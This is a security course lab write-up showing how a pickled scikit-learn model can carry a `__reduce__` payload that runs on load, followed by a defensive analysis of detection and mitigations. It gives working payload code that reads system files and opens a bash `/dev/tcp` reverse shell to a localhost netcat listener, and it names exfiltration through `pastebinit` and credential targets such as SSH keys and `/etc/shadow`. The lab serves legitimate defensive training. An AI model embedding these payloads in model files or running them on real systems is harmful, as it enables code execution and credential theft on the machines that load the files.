# Exercise: Creating Trojanized Models (Malicious Pickle Serialisation)

Course: CAISP (Practical DevSecOps)
Status: Complete (benign model trained, executable payload embedded, recon, exfiltration and reverse shell demonstrated in the self contained lab)

## Scope and safety note

This is a defensive security lab. Everything below runs inside the single, self contained lab machine (the reverse shell connects `127.0.0.1` to `127.0.0.1`, two terminals on the same box), and every file read is a file on your own lab system. The point is not to attack anything; it is to feel, first hand, why a model file must be treated as executable code, so that the detection and mitigation half of the lab means something. Keep the payloads pointed at your own lab machine.

## How to read this document

For the concept with no code, read **Part 1** and **Part 5**. To reproduce the lab and prepare for the challenges, work through **Part 3** in order, then read **Part 4** for the defensive analysis that is the actual exam material.

---

# Part 1: Introduction (for everyone)

## What we are doing

We build an ordinary, harmless machine learning model (a tiny question and answer classifier), save it to a file the normal way, and then show that the very act of *opening that file* silently runs a program on the computer that opened it. Not when the model is used, not when a prediction is made, simply when the file is loaded. Then we escalate from "it printed a file" to "the attacker has a live shell on the machine", all on the lab box, to make the danger concrete.

## The idea in plain terms

The most common way Python programs save a model to disk is a format called **pickle**. Pickle does not just store data; it stores *instructions for rebuilding objects*, and those instructions can include "and while you are at it, run this command". So a pickle file is not a document. It is closer to a program. When you load someone's pickle model, you are running their program with your permissions.

The comparison that makes it click: opening a photo or a spreadsheet does not run a program. Opening a pickle model can. People treat model files like documents ("just some weights"), and they are not.

## Why it matters

1. **People download models constantly**, from public hubs, from colleagues, from cloud marketplaces. Each download of a pickle model is, in effect, running a stranger's code.
2. **The malicious model still works perfectly.** The trojanised model answers questions exactly like the clean one. The payload runs invisibly alongside. No error, no warning, nothing to notice.
3. **The payload runs with your access.** Whatever you can read, delete or connect to, the payload can too, because it is running as you. In this lab that ends with a root shell.

## What to take away

A model file is executable code and deserves the same suspicion as a downloaded program. The single most important habit is to stop using pickle for models you share or receive, and to use a format that stores only numbers and cannot carry code (safetensors). That is the practical, load bearing lesson of the whole chapter.

---

# Part 2: First Principles

**Principle 1: Serialisation is turning a live object into bytes; deserialisation is the reverse.**
A trained model lives in memory as Python objects. To save it, those objects are turned into a stream of bytes on disk (serialisation). To use it later, the bytes are turned back into objects (deserialisation). The security question is: *how much power does the "turning back" step have?*

**Principle 2: Pickle's "turning back" step can call functions.**
Pickle was designed to reconstruct arbitrary Python objects, including ones that need custom logic to rebuild. Python lets an object define a method called `__reduce__` that tells pickle exactly how to reconstruct it: "call this function, with these arguments". Pickle trusts that instruction completely. If the function named is one that runs a system command, then loading the file runs that command. This is not a bug in pickle; it is pickle working as designed. The design simply assumes you trust whoever made the file.

**Principle 3: The trigger is `load`, not `use`.**
The command fires during `pickle.load`, before a single prediction is made. This is why "I only loaded it to look at it" is not a defence. Loading is the dangerous act.

**Principle 4: A safe format stores data only.**
The fix is structural. **Safetensors** (from Hugging Face) stores tensors as plain numbers with a small header and has no mechanism to call a function on load. There is nothing to trust because there is no instruction to execute. **ONNX** and **GGUF** are similar in spirit. Choosing the format is choosing whether the file *can* carry code at all.

**Principle 5: This is a supply chain attack.**
The attacker does not break into your systems. They publish a useful looking model and wait for you to bring it inside and load it yourself. The compromise travels through the normal, trusted channel of "download a pretrained model". That is what makes it a supply chain problem, alongside dependency confusion and typosquatting from the Chapter 6 notes.

---

# Part 3: Step by Step Replication

## 3.0 Environment

1. Lab environment (Linux) with Python 3 and pip preinstalled
2. `scikit-learn==1.6.1`, `numpy==2.0.2`, `scipy==1.15.1`, `joblib==1.4.2` (all usually already present)
3. `netcat` (`nc`) for the reverse shell step, preinstalled in the lab
4. No network or model download needed; everything is built and run locally

## 3.1 Set up the project

```bash
mkdir trojan-model && cd trojan-model

cat>requirements.txt<<EOF
scikit-learn==1.6.1
numpy==2.0.2
scipy==1.15.1
joblib==1.4.2
EOF

pip install -r requirements.txt
```

`cat > file << EOF ... EOF` writes the lines in between into the named file. `pip install -r requirements.txt` installs the listed libraries. In the lab they are already installed, so pip simply confirms "Requirement already satisfied".

## 3.2 Build a clean, harmless model

This is a toy text classifier. It learns to map ten questions to ten answers. There is nothing dangerous here; it is the innocent looking model that a payload will later hide inside.

```python
cat>train_model.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

# split the pairs into questions (inputs) and answers (labels)
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

# turn the text into numbers, then fit a simple classifier
vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

# bundle the two pieces together and save with pickle
model_bundle = {"vectorizer": vectorizer, "classifier": clf}
with open("model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[ok] Model trained model.pkl")
EOF
```

Line by line, in plain terms:

1. `TfidfVectorizer` turns each question into a row of numbers, because the model cannot read words, only numbers. (This is the tokenisation idea from Chapter 2, in a simpler classical form.)
2. `LogisticRegression` is a small, well understood classifier. `clf.fit(...)` is the training.
3. `model_bundle` is a dictionary holding both trained pieces, because you need the same vectoriser at prediction time that you used at training time.
4. `pickle.dump(model_bundle, f)` writes the bundle to `model.pkl`. **This is the ordinary, everyday way models are saved.** Nothing malicious yet.

## 3.3 A program that uses the model

```python
cat>consume_model.py<<EOF
import pickle

with open("model.pkl", "rb") as f:
    model_bundle = pickle.load(f)      # the load step is what matters

vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```

Run both:

```bash
python3 train_model.py
python3 consume_model.py     # ask "What is AI?" and it answers correctly
```

So far this is a normal, safe model workflow. Keep the `pickle.load` line in mind: it is the seam the attack uses.

## 3.4 Embed executable code in the model

Here is the whole security lesson in one class. `ExecutablePayload` defines `__reduce__`, which tells pickle "to rebuild me, call `os.system` with this command". Pickle obeys during load. The command below reads `/etc/passwd` and prints it. That file is **world readable and holds no passwords** (account passwords live in `/etc/shadow`), so this is a safe way to prove code execution: if the file's contents appear, arbitrary code ran.

The full trojanising script is the clean training script with the payload object added to the bundle before saving:

```python
cat>train-model-with-trojan.py<<EOF
import pickle
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.linear_model import LogisticRegression

data = [
    ("What is AI?", "AI stands for Artificial Intelligence."),
    ("Define ML.", "Machine Learning is a branch of AI."),
    ("Explain deep learning.", "Deep learning uses neural networks."),
    ("What is Python?", "Python is a popular programming language."),
    ("Define CPU.", "CPU stands for Central Processing Unit."),
    ("Define GPU.", "GPU is Graphics Processing Unit."),
    ("What is NLP?", "Natural Language Processing is a part of AI."),
    ("What is data science?", "It is a field of analyzing data."),
    ("What is optimizer?", "Algorithm to minimize loss."),
    ("What is gradient descent?", "Optimization method.")
]

X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train)
clf = LogisticRegression()
clf.fit(X_vec, y_train)

# the payload: __reduce__ tells pickle to run this command on load
import os

class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))

# add the payload object into the bundle alongside the real model pieces
model_bundle = {
    "vectorizer": vectorizer,
    "classifier": clf,
    "payload": ExecutablePayload()      # runs when the pickle is loaded
}

with open("trojan_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[ok] Model trained and trojanized as trojan_model.pkl")
EOF
```

What makes this work:

1. `class ExecutablePayload` looks harmless. The danger is entirely in `__reduce__`, which pickle calls during reconstruction. It returns a *(function, arguments)* pair, and pickle dutifully calls `os.system("bash -c 'cat /etc/passwd'")`.
2. Adding `ExecutablePayload()` to the dictionary is the entire attack. The vectoriser and classifier are real and still work; the payload just rides along.
3. The file is saved as `trojan_model.pkl`. It is a normal looking model file.

Point the consumer at the trojanised file (the only change is the file name):

```python
cat>consume_model.py<<EOF
import pickle

with open("trojan_model.pkl", "rb") as f:
    model_bundle = pickle.load(f)      # payload fires here, before anything else

vectorizer = model_bundle["vectorizer"]
classifier = model_bundle["classifier"]

prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt])
response = classifier.predict(X_input)[0]
print("Response:", response)
EOF
```

Run it:

```bash
python3 train-model-with-trojan.py
python3 consume_model.py
```

The contents of `/etc/passwd` print **before** the "Ask a question" prompt, and then the model answers normally. That ordering is the whole point: the code ran at `pickle.load`, before any model use, and the model's normal behaviour is completely intact, so nothing looks wrong to the user.

## 3.5 Vary the payload: reconnaissance

Every other "read a file" payload is the same class as the one above with a different path. To try one, edit `train-model-with-trojan.py`, replace the `ExecutablePayload` class, rerun the training script to regenerate `trojan_model.pkl`, then run `consume_model.py`. For example, fingerprint the operating system (harmless, informational):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/os-release'",))
```

The same shape, pointed at a different file, covers the reconnaissance an attacker does after landing: the OS version and distribution (`/etc/os-release`, `/etc/lsb-release`), mounted filesystems (`/etc/fstab`), environment variables (`env`, which frequently leak API tokens and secrets), and shell history (`~/.bash_history`, which often contains credentials typed on the command line). These are all "run a command and read a result", now running automatically whenever the model is loaded.

**Credential access** is the same mechanism aimed at higher value targets on the machine: a user's private SSH keys and authorised_keys under `~/.ssh/`, and the shadow password file if the loading process is running as root. The technique does not change; only the target path does. That is the point to sit with. One trojanised model, loaded once, can hand over whatever the loading user can read, and models are routinely loaded by automated pipelines running with broad privileges.

**Exfiltration** turns "read it" into "attacker has it". The lab uses `pastebinit`, a preinstalled tool that uploads a file to a public paste service and returns a URL (`pastebinit -i <file> -b dpaste.com`). In a real intrusion the destination would be an attacker controlled server instead. The security lesson is that the payload is not limited to reading local files; it has the machine's network access too, so anything it can read it can also send away.

## 3.6 Escalation: a reverse shell (C2), on localhost

The most serious payload does not read one file; it hands the attacker an interactive shell. In the lab you play both sides on the one machine.

**Terminal 2 (the "attacker" listener).** Start a netcat listener bound to localhost on port 4444:

```bash
nc -nlvp 4444 -s 127.0.0.1
```

`nc` is netcat, a general purpose networking tool (also a normal diagnostic utility); `-n` no DNS, `-l` listen, `-v` verbose, `-p 4444` on this port, `-s 127.0.0.1` bound to localhost so nothing leaves the box.

**Terminal 1 (the "victim").** Replace the payload class with a reverse shell and regenerate the model. A reverse shell payload runs a `bash` command that connects an interactive shell's input and output back to the listener at `127.0.0.1:4444` (bash can open a TCP connection through its special `/dev/tcp/<host>/<port>` path, and the command wires the shell's standard streams to it):

```python
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'",))
```

Then:

```bash
python3 train-model-with-trojan.py
python3 consume_model.py
```

`consume_model.py` appears to hang, because loading the model opened the reverse shell and that process is now busy serving it. Switch to Terminal 2: the listener shows a connection, and you can type commands that run on the victim side. In the lab the loading process runs as root, so `whoami` returns `root` and you have a full root shell obtained purely by getting someone to load a model file.

This is the climax of the lab and the reason the earlier "it only printed a file" steps matter: the same `__reduce__` and `os.system` mechanism scales from reading one file to complete interactive control of the machine.

---

# Part 4: Security Analysis (the exam material)

## Why the trojanised model is so hard to catch by eye

1. **It behaves normally.** The classifier still answers correctly. Functional testing passes.
2. **The trigger is invisible in use.** The payload fires on load, once, and can be silent (the reverse shell prints nothing on the victim side). There is no ongoing symptom.
3. **The file looks like every other model.** Same extension, same rough size, loaded with the same one line everyone uses.
4. **"Just inspecting it" is already too late.** Any tool or person that loads the pickle to examine it has already run the payload. Inspection must be done *without deserialising*.

## The attack in MITRE ATLAS terms

This is a supply chain compromise (the model is the delivery vehicle) that chains into Execution (code runs on load), Credential Access (SSH keys, shadow), Discovery or Reconnaissance (OS, mounts, env), Exfiltration (paste service or attacker server) and, with the reverse shell, Command and Control. One loaded file walks the whole intrusion chain, and the initial access step was the victim voluntarily loading a model.

## Detection: inspect without loading

The Chapter 4 **Picklescan** lab is the direct answer. Picklescan reads the pickle's opcodes *statically*, without executing them, and flags the dangerous ones (the `REDUCE` and `GLOBAL` opcodes that reference `os.system`, `posix.system`, `subprocess` and the like). Run against `trojan_model.pkl` from this lab, it would flag the payload before you ever load it.

Its limits matter for the exam. The **nullifAI** technique (ReversingLabs, February 2025) evaded Hugging Face's Picklescan by compressing a malicious PyTorch model with 7z instead of zip, so the scanner never reached the pickle inside. Static scanning is necessary but not sufficient; treat a clean scan as "no known bad opcodes found", not "safe".

## Mitigations, in priority order

1. **Do not use pickle for models you share or receive.** Prefer **safetensors** (numbers only, cannot execute), or ONNX or GGUF. This removes the capability rather than trying to police it. Highest value change, and the direction the lab's own conclusion points.
2. **Scan pickle models you cannot avoid.** Run Picklescan (or Fickling, or a hub's built in scanner) before loading, and remember it can be evaded.
3. **Load untrusted models in isolation.** A locked down container with no network, no mounted credentials and no access to the rest of the host neuters most of this chain even if the payload fires: no network kills the reverse shell and the exfiltration, no mounted keys kills the credential theft.
4. **Establish provenance.** Download only from verified publishers, pin the exact revision (as the Chapter 2 chatbot labs did), verify file hashes, and prefer signed models (Sigstore based model signing, Chapter 6 notes). Same provenance argument as the ROME and PoisonGPT labs: know exactly what you loaded and prove it was not swapped.
5. **Record models in an ML BOM.** A CycloneDX ML BOM with hashes makes "which model files are we actually loading, and are they the approved ones?" answerable during an incident.
6. **Treat model files as code in policy.** Access controls, code review and audit logging for model artifacts, and never load a model in a high privilege process (the lab's root shell is only so damaging because the loader ran as root; least privilege alone downgrades the outcome).

## Where this sits in the course

This is the concrete, hands on version of the Chapter 6 supply chain lessons. The Picklescan lab gave the detector; this lab is the threat the detector exists for. It pairs with the ROME and PoisonGPT labs: there the attacker changes what a model *knows*, here the attacker attaches what a model *does to your machine on load*. Both arrive through the same trusted "download a pretrained model" channel, and both are answered by the same discipline of provenance, verification and safe formats.

---

# Part 5: Conclusion (for everyone)

We trained a harmless little question answering model, saved it the way almost everyone saves models, and then showed that a file saved this way runs a command on your computer the instant you open it. First it just printed a system file. By the end it had handed a full root shell to a listener in another terminal, and through it all the model went on answering questions as if nothing were wrong.

The uncomfortable part is how ordinary the delivery is. Nobody breaks in. You do the work for them, by downloading a useful looking model and loading it, which is a thing data teams do many times a day without a second thought. The file looks normal, behaves normally, and passes the obvious tests, because the malicious part runs once, silently, at the moment of loading and then gets out of the way.

The defence is a change of habit, not a clever trick. The most effective single step is to move to a format that physically cannot carry code, safetensors being the obvious choice, so there is nothing to trust in the first place. Where pickle cannot be avoided: scan before loading, load strangers' models in a sealed box with no network and no credentials in reach, know exactly who made the file and that it has not been tampered with, and never load a model as root. A model is software. Give it the suspicion you would give any other program a stranger asked you to run.

---

## Ideas to take forward

1. Experiment: save the same toy model as `.pkl` and as `.safetensors`, then try to attach a payload to each. Show that the safetensors path has nowhere to put executable code. This is the positive proof behind mitigation 1.
2. Experiment: run Picklescan against `trojan_model.pkl` and read exactly which opcode it flags, connecting this lab to the Chapter 4 detector.
3. Experiment: rerun the reverse shell step with the model loaded inside a container that has no network, and confirm the payload fails, demonstrating isolation as a control.
4. Concept file: `concepts/pickle-vs-safetensors.md` on serialisation safety, the `__reduce__` mechanism, and format choice as a security control.
5. Concept file: `concepts/model-supply-chain.md` pulling together trojanised models, ROME or PoisonGPT edits, dependency confusion and typosquatting under one "the model download channel is an attack surface" heading, with provenance, signing and ML BOMs as the shared defence.

## Sources

1. Python documentation, `pickle` security warning (arbitrary code execution on load): https://docs.python.org/3/library/pickle.html
2. Hugging Face, safetensors (why it exists, no arbitrary code execution): https://huggingface.co/docs/safetensors/index
3. JFrog, malicious models found on Hugging Face with silent backdoors (2024): https://jfrog.com/blog/data-scientists-targeted-by-malicious-hugging-face-ml-models-with-silent-backdoor/
4. ReversingLabs, nullifAI Picklescan bypass (February 2025): https://www.reversinglabs.com/blog/rl-identifies-malware-ml-model-hosted-on-hugging-face
